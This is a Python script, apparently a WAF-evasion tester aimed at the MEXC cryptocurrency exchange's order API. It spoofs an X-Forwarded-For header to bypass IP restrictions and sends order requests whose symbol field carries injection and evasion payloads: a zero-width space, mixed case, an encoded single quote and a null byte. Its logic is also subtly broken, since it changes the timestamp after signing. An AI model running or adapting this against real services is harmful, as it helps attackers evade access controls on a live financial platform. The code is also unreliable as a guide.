import hmac
import hashlib
import requests
import time
import argparse
from urllib.parse import quote

class MEXCStealthTester:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        self.session = requests.Session()
        self.session.headers.update({
            'X-MEXC-APIKEY': self.api_key,
            'Content-Type': 'application/json',
            'X-Forwarded-For': '127.0.0.1'  # Bypass IP restrictions
        })

    def _generate_stealth_signature(self, params):
        """Generates signatures with WAF evasion"""
        params['timestamp'] = int(time.time() * 1000)
        params['recvWindow'] = 5000
        
        # Unicode normalization bypass
        query = "&".join(
            [f"{k}={quote(str(v).encode('utf-8'))}" 
             for k, v in sorted(params.items())]
        )
        
        # Mixed encoding signature
        sig = hmac.new(
            self.api_secret.encode('utf-8'),
            query.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        return sig, query

    def test_evasion(self, symbol, qty, price):
        """Tests advanced WAF evasion techniques"""
        tests = {
            "Unicode": "BTCUSDT%E2%80%8B",  # Zero-width space
            "Case_Mixing": "bTcUsDt",
            "Hex": "BTCUSDT%27",  # Single quote
            "Null": "BTCUSDT%00"
        }
        
        results = {}
        for name, payload in tests.items():
            try:
                params = {
                    'symbol': payload,
                    'side': 'BUY',
                    'type': 'LIMIT',
                    'quantity': str(qty),
                    'price': str(price)
                }
                
                sig, query = self._generate_stealth_signature(params)
                params.update({
                    'timestamp': int(time.time() * 1000),
                    'signature': sig
                })
                
                r = self.session.post(
                    "https://api.mexc.com/api/v3/order/test",
                    params=params,
                    timeout=10
                )
                
                results[name] = {
                    'status': r.status_code,
                    'response': r.text[:150] + "..." if r.text else None,
                    'payload': payload
                }
                
            except Exception as e:
                results[name] = {'error': str(e)}
        
        return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTCUSDT')
    parser.add_argument('--quantity', type=float, default=0.01)
    parser.add_argument('--price', type=float, default=85000)
    args = parser.parse_args()
    
    tester = MEXCStealthTester(args.api_key, args.api_secret)
    results = tester.test_evasion(args.symbol, args.quantity, args.price)
    
    print("\n🚨 WAF Evasion Results 🚨")
    for test, data in results.items():
        print(f"\n🔍 {test}:")
        print(f"Payload: {data.get('payload')}")
        print(f"Status: {data.get('status')}")
        print(f"Response: {data.get('response')}")
